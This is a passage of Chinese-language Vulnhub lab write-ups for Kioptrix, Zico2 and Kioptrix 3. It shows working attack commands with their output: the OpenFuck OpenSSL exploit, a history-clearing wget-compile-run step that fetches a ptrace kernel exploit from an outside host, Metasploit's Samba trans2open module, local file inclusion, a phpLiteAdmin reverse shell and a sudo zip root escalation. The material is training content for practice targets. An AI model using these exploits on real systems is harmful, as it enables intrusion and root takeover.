第961行,修改为const unsigned char * p，* end;
然后编译
gcc -o OpenFuck 764.c -lcrypto 
运行脚本 ./OpenFuck 选择相应我系统版本
这里选择 0x6b
执行相关的命令 ./OpenFuck 0x6b 192.168.43.54
root@kali:~/Desktop# ./OpenFuck 0x6b 192.168.43.54 
******************************************************************* 
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open * 
******************************************************************* 
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE * 
* #hackarena  irc.brasnet.org                                     * 
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * 
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * 
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * 
******************************************************************* 
Establishing SSL connection 
cipher: 0x4043808c   ciphers: 0x80f80e0 
Ready to send shellcode 
Spawning shell... 
bash: no job control in this shell 
bash-2.05$  
bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/030exploits/ptrace-
kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p;  
--04:04:37--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c 
           => `ptrace-kmod.c' 
Connecting to dl.packetstormsecurity.net:80... connected! 
HTTP request sent, awaiting response... 301 Moved Permanently 
Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following] 
--04:04:38--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c 
           => `ptrace-kmod.c' 
Connecting to dl.packetstormsecurity.net:443... connected! 
HTTP request sent, awaiting response... 200 OK 
Length: 3,921 [text/x-csrc] 
    0K ...                                                   100% @   3.74 MB/s 
04:04:39 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921] 
[+] Attached to 6498 
[+] Waiting for signal 
[+] Signal caught 
[+] Shellcode placed at 0x4001189d 
[+] Now wait for suid shell... 
id 
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 
whoami 
root 
Samba漏洞利用
实验环境是存在一个samba漏洞的，
这里用到 enum4linux 其利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，
其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息。
但我本地环境没有检测到samba的版本
该漏洞为 Samba trans2open溢出（Linux x86） 在Samba 2.2.0到2.2.8版本中发现的缓冲区溢出.
同样可以在 searchsploit 查到
这里直接用msf环境进行实验。
msf exploit(linux/samba/trans2open) > show options  
Module options (exploit/linux/samba/trans2open): 
   Name   Current Setting  Required  Description 
   ----   ---------------  --------  ----------- 
   RHOST  192.168.43.54   yes       The target address 
   RPORT  139              yes       The target port (TCP) 
Payload options (linux/x86/shell_bind_tcp): 
   Name   Current Setting  Required  Description 
   ----   ---------------  --------  ----------- 
   LPORT  4444             yes       The listen port 
   RHOST  192.168.43.54   no        The target address 
Exploit target: 
   Id  Name 
   --  ---- 
   0   Samba 2.2.x - Bruteforce 
msf exploit(linux/samba/trans2open) > exploit 
[*] Started bind handler 
[*] 192.168.43.54:139 - Trying return address 0xbffffdfc... 
[*] 192.168.43.54:139 - Trying return address 0xbffffcfc... 
[*] 192.168.43.54:139 - Trying return address 0xbffffbfc... 
[*] 192.168.43.54:139 - Trying return address 0xbffffafc... 
[*] Command shell session 2 opened (192.168.43.177:33375 -> 192.168.43.54:4444) at 2018-05-07 
04:47:42 -0400 
id 
uid=0(root) gid=0(root) groups=99(nobody) 
总结
虽然说这个实验环境比较老，一些漏洞可能在现实的实战中是很少存在的。但是在这个漏洞利用的过程中可以学到
一些 kali linux 的工具的利用和一些实战的思路。
第十四节  Zico2
title: Vulnhub渗透测试练习 - Zico2 date: 2018-05-05 22:30:35 categories: 笔记
作者：Ukonw
vulnhub渗透环境
靶机地址
https://www.vulnhub.com/entry/zico2-1,210/
练习环境
Kali Linux  
VirtualBox
信息收集
在信息收集之前需要获取到靶机的IP地址，我靶机在VirtualBox下是 Host-Only 网络模式，而靶机是无法直接进入
系统看到IP地址的。
这里用到一个kali linux下的一个工具 netdiscover 基于ARP的网络扫描工具。
直接执行命令 netdiscover :
这里我们获取到两个IP地址，测试发现正确的是 192.168.56.102
接下来用 nmap 扫描端口信息
nmap -A 192.168.56.102
得到80端口上运行着一个Web服务器。
访问该Web服务，在这个时候我们可以用常见的扫描工具对网站进行扫描
漏洞利用
这里我简单对页面进行浏览，发现了一个文件包含漏洞。
view.php?page=tools.html 
尝试包含 ../../etc/passwd
成功包含，解下来就尝试扫描目录，因为校园网的原因，只能用 Host-Only 网络模式进行测试，所以一切测试过程
都在 Kali 下进行
这里尝试去扫描网站的目录，用到 kali 下的 dirb 专门用于爆破目录的工具。
得到一个 dbadmin 的目录
这里用到的是一个叫 phpLiteAdmin 服务器应用，版本号为 v1.9.3
尝试找找这个版本的历史漏洞，这个服务是存在一个远程PHP代码注入漏洞的。
这里可以通过搜索引擎搜索相关漏洞详情也可以用 kali 下的 Searchsploit 一个用于Exploit-DB的命令行搜索工
具。
这样们就可以看到漏洞详情，这里我们可以看到利用这个远程PHP代码注入漏洞需要登录的。
所以尝试默认密码 admin ，发现可以直接登录进去。
从 exploit-db 上的资料可以看出，我们需要创建一个数据库，写入一个shell。
这里可以用nc监听端口来反弹shell，也可以用msf生成php目录进行监听。
按照 exploit-db 所说的建立数据库。这里直接创建一个后缀名为 .php 的数据库 shell
并添加表信息
这里在本地的 /var/www/html 目录下创建txt文件
&3 2>&3");?> 
然后启动apache web服务器
service apache2 start 
然后返回到数据库中添加字段名，类型为 TEXT ,写入PHP代码来下载执行shell
需要让目标下载执行这串恶意代码，需要一个HTTP请求。
这里我们就可以利用到之前发现的本地文件包含的漏洞了。
我们可以在数据库中发现我们恶意创建的数据库的路径
/usr/databases/shell.php 
先用nc监听我们之前设置的端口 2333
这里我们就可以反弹一个shell了。
权限提升
在反弹了shell后，对目录进行检查发现了
/home/zico中有一个 wordpress 目录，是一个常见的CMS
进入查看wp-conﬁg.php文件。
发现了用户zico的登录凭证，我们可以用 ssh 来连接。
ssh PI:EMAIL 
利用 sudo -l 查看目前用户可执行与无法执行的指令；
这里表明当前用户 zico 可以利用root权限无密码执行 tar 和 zip 命令
这里可以利用 touch exploit 创建一个随机文件，并用 zip 命令进行压缩
sudo zip exploit.zip exploit -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'" 
sudo 用管理员权限执行 
-T 检查文件的完整性。这个参数可以让他执行下一个参数 --unzip-command，在这个参数中写入一个python
的交互shell
由此的到 root 权限，接下来就可以进入 /root 目录了
cat /root/flag.txt 得到ﬂag。
总结
vulnhub里面有很多不同的环境提供渗透，第一次完成一次完整的渗透过程，学到了很多东西。 
在文章的开头用到了 kali linux 下的一个工具 netdiscover 基于ARP的网络扫描工具。记得在一个师傅的面
试经验介绍中，他被面试官问到为什么要用arp去探测内网主机，他回答的是相当隐蔽，探测的信息更准确。
主要是因为传统探测远程主机是否存活的方法是通过ICMP协议中的回显应答报文来探测(ping)。很多主机为
了避免被扫描器探测，通过防火墙将ICMP包屏蔽，从而达到在网络中隐藏的目的。 
在文章中用到了两种语言的交互shell。分别是php和python，这里参考老外的博客Reverse Shell Cheat 
Sheet 
对于我个人在提权实战经验方面是十分少的，在这次练习中学到了可以利用touch exploit 创建一个随
机文件，并用 zip 命令进行压缩，由此可见还是自己的实战经验太少了。 
最后感概下，英文的重要性。国外很多大牛的博客都是很丰富的，而对于一个英语四级425飘过的菜鸡，
我也是很无奈的。只能靠百度翻译了。
第十五节 Kioptrix 3
title: Vulnhub渗透测试练习-Kioptrix 3 date: 2018-05-08 20:01:26 categories: 笔记
作者：Ukonw
信息收集
同样用 netdiscover 发现目标主机。
root@kali:~# netdiscover  
 Currently scanning: 192.168.194.0/16   |   Screen View: Unique Hosts           
 13 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 780               
 _____________________________________________________________________________ 
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname       
 ----------------------------------------------------------------------------- 
 192.168.43.1    ac:c1:ee:31:3f:25      6     360  Xiaomi Communications Co Ltd 
 192.168.43.33   44:03:2c:68:d8:0f      2     120  Intel Corporate              
 192.168.43.58   00:0c:29:b2:76:40      4     240  VMware, Inc.                 
 192.168.43.158  00:0c:29:38:2d:6f      1      60  VMware, Inc.  
目标IP为 192.168.43.158 。
用nmap扫描目标主机端口信息。
root@kali:~# nmap -A -sS -n 192.168.43.158 
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-08 07:45 EDT 
Nmap scan report for 192.168.43.158 
Host is up (0.00053s latency). 
Not shown: 998 closed ports 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) 
| ssh-hostkey:  
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA) 
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA) 
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch) 
| http-cookie-flags:  
|   /:  
|     PHPSESSID:  
|_      httponly flag not set 
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch 
|_http-title: Ligoat Security - Got Goat? Security ... 
MAC Address: 00:0C:29:38:2D:6F (VMware) 
Device type: general purpose 
Running: Linux 2.6.X 
OS CPE: cpe:/o:linux:linux_kernel:2.6 
OS details: Linux 2.6.9 - 2.6.33 
Network Distance: 1 hop 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
TRACEROUTE 
HOP RTT     ADDRESS 
1   0.53 ms 192.168.43.158 
OS and Service detection performed. Please report any incorrect results at 
https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds 
由扫描信息可以得到
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) 
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch) 
OS details: Linux 2.6.9 - 2.6.33
80端口可以看出cms为 Lotus CMS 。
用 dirb 扫描一下网站目录。也可以用御剑扫描目录。发现存在 phpdamin
cms后台 http://192.168.43.158/index.php?system=Admin
漏洞利用
文件包含&后台上传